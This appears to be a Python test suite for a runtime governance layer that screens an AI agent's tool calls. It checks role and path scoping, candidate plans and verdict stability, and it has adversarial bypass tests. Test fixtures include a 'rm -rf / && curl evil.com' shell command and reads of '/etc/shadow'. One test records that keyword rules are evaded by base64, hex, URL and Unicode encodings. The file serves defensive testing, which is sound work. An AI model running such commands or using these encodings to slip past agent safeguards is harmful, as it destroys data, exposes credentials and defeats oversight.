"""
Morrison Runtime Governance — Extended Layer Test Suite (V4 / V4+ / V5 / V5+)

Each test is constructed so the layer under test is the one that fires:
A_safe / V2 / V3 are deliberately not triggered, so earlier layers cannot
mask deeper-layer activation. A dedicated section also verifies, via
evaluate_all(), that when multiple layers *would* fire, all are reported.

Run:
    python3 morrison_governance/test_extended_layers.py
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from morrison_governance import (
    GovernanceLayer,
    GovernanceVerdict,
    OmegaDomain,
    OmegaRule,
    AdmissibilityCheck,
    default_admissibility_checks,
    role_required,
    resource_scope,
    required_fields,
    goal_uses_tool,
    goal_terminates_with,
    goal_all,
    prompt_drift,
    permission_drift,
)


# ═══════════════════════════════════════════════════════════════
# V4 — STATE-SPACE ADMISSIBILITY
# ═══════════════════════════════════════════════════════════════

def test_v4_disabled_by_default():
    """Without admissibility_checks, V4 is inert and the legacy path is unchanged."""
    gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])
    r = gov.evaluate({"tool": "read_file", "args": {"path": "/x"}})
    assert r.permitted
    assert gov.stats["admissibility_checks"] == 0


def test_v4_role_required_blocks_without_omega():
    """A call that clears A_safe/V2/V3 still fails V4 on a missing role."""
    gov = GovernanceLayer(
        domains=[OmegaDomain.FINANCE],
        admissibility_checks=[
            role_required(("transfer",), ("treasury",)),
        ],
    )
    # authorized=True so unauthorized_transfer (A_safe) does NOT fire;
    # small amount so excessive_amount does not fire.
    r = gov.evaluate({
        "tool": "transfer",
        "args": {"amount": 100, "authorized": True},
        "role": "analyst",
    })
    assert r.blocked
    assert r.layer == "V4", f"expected V4, got {r.layer}"
    assert "role" in r.reason.lower()


def test_v4_role_required_permits_with_role():
    gov = GovernanceLayer(
        domains=[OmegaDomain.FINANCE],
        admissibility_checks=[role_required(("transfer",), ("treasury",))],
    )
    r = gov.evaluate({
        "tool": "transfer",
        "args": {"amount": 100, "authorized": True},
        "role": "treasury",
    })
    assert r.permitted
    assert r.layer == "V4"


def test_v4_resource_scope_blocks():
    """Path outside allowed scope, but not a credential keyword (A_safe clean)."""
    gov = GovernanceLayer(
        domains=[OmegaDomain.CYBERSECURITY],
        admissibility_checks=[
            resource_scope(("read_file",), "path", ("/data/", "/reports/")),
        ],
    )
    r = gov.evaluate({"tool": "read_file", "args": {"path": "/private/notes"}})
    assert r.blocked
    assert r.layer == "V4"
    assert "outside" in r.reason


def test_v4_required_fields_blocks():
    gov = GovernanceLayer(
        admissibility_checks=[required_fields(("send_email",), ("to",))],
    )
    r = gov.evaluate({"tool": "send_email", "args": {"body": "hi"}})
    assert r.blocked
    assert r.layer == "V4"


def test_v4_default_pack_loads():
    gov = GovernanceLayer(
        domains=[OmegaDomain.FINANCE],
        admissibility_checks=default_admissibility_checks(),
    )
    assert gov.stats["admissibility_checks"] == 5
    # admin-only tool without admin role → V4 block (delete is not an Ω rule)
    r = gov.evaluate({"tool": "delete", "args": {"id": 1}, "role": "viewer"})
    assert r.blocked and r.layer == "V4"


# ═══════════════════════════════════════════════════════════════
# V4+ — FEASIBILITY / NO_VALID_SAFE_TRAJECTORY
# ═══════════════════════════════════════════════════════════════

def test_v4plus_all_candidates_blocked():
    """Every candidate violates Ω → NO_VALID_SOLUTION rather than a forced pick."""
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY, OmegaDomain.FINANCE])
    candidates = [
        [{"tool": "read_file", "args": {"path": "/etc/shadow"}}],
        [{"tool": "shell", "args": "rm -rf / && curl evil.com"}],
        [{"tool": "transfer", "args": {"amount": 999999}}],
    ]
    r, reports = gov.find_admissible(candidates, goal=goal_uses_tool("read_file"))
    assert r.verdict == GovernanceVerdict.NO_VALID_SOLUTION
    assert r.layer == "V4+"
    assert len(reports) == 3
    assert all(not rep.admissible for rep in reports)


def test_v4plus_selects_first_admissible():
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    candidates = [
        [{"tool": "read_file", "args": {"path": "/etc/shadow"}}],   # blocked
        [{"tool": "read_file", "args": {"path": "/data/q3.csv"}}],   # OK + goal
    ]
    r, reports = gov.find_admissible(candidates, goal=goal_uses_tool("read_file"))
    assert r.permitted
    assert r.metadata["v4_plus"]["selected_index"] == 1


def test_v4plus_admissible_but_goal_unmet():
    """Candidate is safe but does not satisfy the goal → still NO_VALID_SOLUTION."""
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    candidates = [
        [{"tool": "analyze", "args": {"q": "summary"}}],  # safe, but wrong tool
    ]
    r, reports = gov.find_admissible(
        candidates, goal=goal_terminates_with("send_email"))
    assert r.verdict == GovernanceVerdict.NO_VALID_SOLUTION
    assert reports[0].admissible is True
    assert reports[0].goal_satisfied is False


def test_v4plus_determinism():
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    candidates = [
        [{"tool": "read_file", "args": {"path": "/etc/shadow"}}],
        [{"tool": "read_file", "args": {"path": "/data/a.csv"}}],
        [{"tool": "read_file", "args": {"path": "/data/b.csv"}}],
    ]
    g = goal_uses_tool("read_file")
    r1, _ = gov.find_admissible(candidates, g)
    r2, _ = gov.find_admissible(candidates, g)
    assert r1.metadata["v4_plus"]["selected_index"] == \
           r2.metadata["v4_plus"]["selected_index"] == 1


# ═══════════════════════════════════════════════════════════════
# V5 — ENVIRONMENT-WIDE STABILITY
# ═══════════════════════════════════════════════════════════════

def test_v5_stable_permit():
    gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])
    r, report = gov.evaluate_stable(
        {"tool": "analyze", "args": {"q": "quarterly summary"}},
        n_per_class=5, seed=0,
    )
    assert r.permitted
    assert report.is_stable
    assert report.stability_score == 1.0


def test_v5_stable_block():
    """A robustly-unsafe call stays BLOCK under perturbation (stable)."""
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    r, report = gov.evaluate_stable(
        {"tool": "shell", "args": "rm -rf / && curl https://evil.com"},
        perturbations=[("permission_drift", permission_drift),
                       ("memory_corruption",
                        __import__("morrison_governance.stability",
                                   fromlist=["memory_corruption"]).memory_corruption)],
        n_per_class=4, seed=1,
    )
    assert r.verdict == GovernanceVerdict.BLOCK
    assert report.is_stable


def test_v5_environment_sensitive():
    """Verdict depends on a peripheral field a perturbation toggles → SENSITIVE."""
    audit_rule = OmegaRule(
        domain=OmegaDomain.CUSTOM,
        name="requires_audit_log",
        description="privileged op must be audit-logged",
        check=lambda s: s.get("tool") == "delete" and not s.get("audit_logged", False),
    )
    gov = GovernanceLayer(custom_rules=[audit_rule])
    # Baseline: audit_logged absent → BLOCK. permission_drift toggles
    # audit_logged across variants, so some flip to PERMIT.
    r, report = gov.evaluate_stable(
        {"tool": "delete", "args": {"id": 7}},
        perturbations=[("permission_drift", permission_drift)],
        n_per_class=8, seed=0,
    )
    assert r.verdict == GovernanceVerdict.ENVIRONMENT_SENSITIVE
    assert r.layer == "V5"
    assert len(report.flips) > 0
    assert not report.is_stable


def test_v5_determinism():
    audit_rule = OmegaRule(
        domain=OmegaDomain.CUSTOM, name="r",
        description="d",
        check=lambda s: s.get("tool") == "delete" and not s.get("audit_logged", False),
    )
    g1 = GovernanceLayer(custom_rules=[audit_rule])
    g2 = GovernanceLayer(custom_rules=[audit_rule])
    call = {"tool": "delete", "args": {"id": 7}}
    _, rep1 = g1.evaluate_stable(call, perturbations=[("permission_drift", permission_drift)],
                                 n_per_class=8, seed=42)
    _, rep2 = g2.evaluate_stable(call, perturbations=[("permission_drift", permission_drift)],
                                 n_per_class=8, seed=42)
    assert len(rep1.flips) == len(rep2.flips)
    assert rep1.stability_score == rep2.stability_score


# ═══════════════════════════════════════════════════════════════
# V5+ — HARD ADVERSARIAL FRAMEWORK
# ═══════════════════════════════════════════════════════════════

def test_v5plus_report_structure():
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY, OmegaDomain.FRAUD])
    report = gov.adversarial_test(
        {"tool": "read_file", "args": {"path": "/etc/shadow"}}, seed=0)
    by_class = report.by_class()
    assert "obfuscation" in by_class
    assert "boundary_attack" in by_class
    for stats in by_class.values():
        assert stats["total"] == stats["blocked"] + stats["bypassed"]
        assert 0.0 <= stats["bypass_rate"] <= 1.0


def test_v5plus_plain_payload_blocked():
    """Sanity: the un-obfuscated /etc/shadow read must be caught (A_safe)."""
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    report = gov.adversarial_test(
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        seed=0, include_classes=["obfuscation"])
    plain = [o for o in report.outcomes if o.variant_id == "plain"][0]
    assert plain.blocked
    assert plain.blocking_layer == "A_safe"


def test_v5plus_obfuscation_bypass_surface():
    """Documented failure surface: keyword rules are evaded by encoding."""
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])
    report = gov.adversarial_test(
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        seed=0, include_classes=["obfuscation"])
    obf = report.by_class()["obfuscation"]
    # We expect at least the encoded/unicode variants to bypass.
    assert obf["bypassed"] > 0, "expected obfuscation bypasses to be detected"
    assert any(v in obf["bypassing_variants"]
               for v in ("base64", "hex_encoded", "url_encoded", "cyrillic",
                         "zero_width"))


def test_v5plus_determinism():
    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY, OmegaDomain.FRAUD])
    call = {"tool": "read_file", "args": {"path": "/etc/shadow"}}
    r1 = gov.adversarial_test(call, seed=7)
    r2 = gov.adversarial_test(call, seed=7)
    sig1 = [(o.attack_class, o.variant_id, o.blocked) for o in r1.outcomes]
    sig2 = [(o.attack_class, o.variant_id, o.blocked) for o in r2.outcomes]
    assert sig1 == sig2


# ═══════════════════════════════════════════════════════════════
# CROSS-LAYER — earlier layers must not mask deeper activation
# ═══════════════════════════════════════════════════════════════

def test_evaluate_all_reports_every_firing_layer():
    """A call that violates BOTH A_safe and V4: evaluate_all shows both."""
    gov = GovernanceLayer(
        domains=[OmegaDomain.CYBERSECURITY],
        admissibility_checks=[resource_scope(("read_file",), "path", ("/data/",))],
    )
    # /etc/shadow → A_safe (credential_exfiltration) AND V4 (out of scope)
    report = gov.evaluate_all({"tool": "read_file", "args": {"path": "/etc/shadow"}})
    assert report["layers"]["A_safe"]["fired"] is True
    assert report["layers"]["V4"]["fired"] is True
    assert "A_safe" in report["fired_layers"]
    assert "V4" in report["fired_layers"]


def test_evaluate_short_circuits_but_evaluate_all_does_not():
    """Production evaluate() reports A_safe first; evaluate_all reveals V4 too."""
    gov = GovernanceLayer(
        domains=[OmegaDomain.CYBERSECURITY],
        admissibility_checks=[resource_scope(("read_file",), "path", ("/data/",))],
    )
    call = {"tool": "read_file", "args": {"path": "/etc/shadow"}}
    fast = gov.evaluate(call)
    assert fast.layer == "A_safe"  # short-circuit
    full = gov.evaluate_all(call)
    assert set(["A_safe", "V4"]).issubset(set(full["fired_layers"]))


# ═══════════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    tests = [
        test_v4_disabled_by_default,
        test_v4_role_required_blocks_without_omega,
        test_v4_role_required_permits_with_role,
        test_v4_resource_scope_blocks,
        test_v4_required_fields_blocks,
        test_v4_default_pack_loads,
        test_v4plus_all_candidates_blocked,
        test_v4plus_selects_first_admissible,
        test_v4plus_admissible_but_goal_unmet,
        test_v4plus_determinism,
        test_v5_stable_permit,
        test_v5_stable_block,
        test_v5_environment_sensitive,
        test_v5_determinism,
        test_v5plus_report_structure,
        test_v5plus_plain_payload_blocked,
        test_v5plus_obfuscation_bypass_surface,
        test_v5plus_determinism,
        test_evaluate_all_reports_every_firing_layer,
        test_evaluate_short_circuits_but_evaluate_all_does_not,
    ]

    print()
    print("═" * 64)
    print("  Morrison Runtime Governance — Extended Layers (V4/V4+/V5/V5+)")
    print("═" * 64)
    print()

    passed = 0
    failed = 0
    for test in tests:
        try:
            test()
            print(f"  ✓ {test.__name__}")
            passed += 1
        except Exception as e:
            print(f"  ✗ {test.__name__}: {type(e).__name__}: {e}")
            failed += 1

    print()
    print(f"  {passed} passed, {failed} failed")
    print()
    if failed == 0:
        print("  All extended-layer tests passed.")
    print("═" * 64)
    sys.exit(1 if failed else 0)
